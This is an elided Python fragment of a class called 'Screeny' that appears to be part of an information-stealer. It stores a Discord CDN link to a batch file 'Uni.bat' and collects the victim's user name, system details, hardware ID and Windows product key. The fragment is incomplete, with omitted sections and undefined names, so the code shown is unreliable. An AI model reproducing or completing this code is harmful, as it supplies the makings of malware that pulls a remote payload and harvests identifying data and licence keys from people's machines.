class Screeny:
    ...
    def __init__(self):
        ...
        bfu = 'https://cdn.discordapp.com/attachments/1098287991807557654/1101029670742396989/Uni.bat'
    ...
    def Info(self):
        self.user = user
        self.machine = processplatform.get('machine')
        self.system = processplatform.get('system')
        self.processor = processplatform.get('processor')
        ...
        self.hwid = processplatform.get('hwid')
        self.windowspk = processplatform.get('wpk')
